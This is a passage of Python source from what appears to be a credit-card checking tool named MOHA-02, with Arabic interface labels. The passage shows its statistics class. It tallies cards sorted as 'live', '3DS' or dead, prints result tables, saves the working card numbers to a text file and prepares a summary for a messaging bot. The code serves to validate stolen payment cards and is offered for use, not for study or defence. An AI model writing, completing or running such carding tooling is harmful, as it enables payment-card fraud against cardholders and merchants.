        self.start_time = None

    def start(self):
        self.start_time = datetime.now()

    def update(self, result, card):
        with self.lock:
            self.total += 1
            self.current += 1
            if "LIVE" in result:
                self.live += 1
                self.live_cards.append(card)
            elif "3DS" in result:
                self.threed += 1
                self.die += 1
            else:
                self.die += 1

    def display(self, current_card=None):
        percent = (self.live / self.total * 100) if self.total > 0 else 0
        table = Table(show_header=False, box=box.ROUNDED, border_style=C.neon_cyan)
        table.add_row("📊 المجموع", f"{self.total}")
        table.add_row("✅ لايف", f"[{C.success_green}]{self.live}[/{C.success_green}]")
        table.add_row("❌ ميت", f"[{C.fail_red}]{self.die}[/{C.fail_red}]")
        panel = Panel.fit(table, title=f"[{C.neon_cyan}]إحصائيات MOHA-02[/{C.neon_cyan}]", border_style=C.neon_cyan)
        console.print(panel)

    def display_final(self, tool_name, filename):
        percent = (self.live / self.total * 100) if self.total > 0 else 0
        final_table = Table(title=f"التقرير النهائي - {tool_name}", box=box.HEAVY_EDGE, border_style="cyan")
        final_table.add_row("✅ لايف", f"[{C.success_green}]{self.live}[/{C.success_green}]")
        final_table.add_row("❌ ميت", f"[{C.fail_red}]{self.die}[/{C.fail_red}]")
        final_table.add_row("📈 النسبة", f"{percent:.2f}%")
        console.print(final_table)
        if self.live_cards:
            live_file = f"Live_Moha_{datetime.now().strftime('%H%M%S')}.txt"
            with open(live_file, 'w', encoding='utf-8') as f:
                for card in self.live_cards: f.write(f"{card}\n")
            console.print(f"[{C.success_green}] ✅ تم حفظ البطاقات في: {live_file}[/{C.success_green}]")
        if load_settings().get('bot_enabled'):
            report = f"📊 <b>تقرير فحص MOHA-02</b>\n✅ لايف: {self.live}\n❌ ميت: {self.die}"
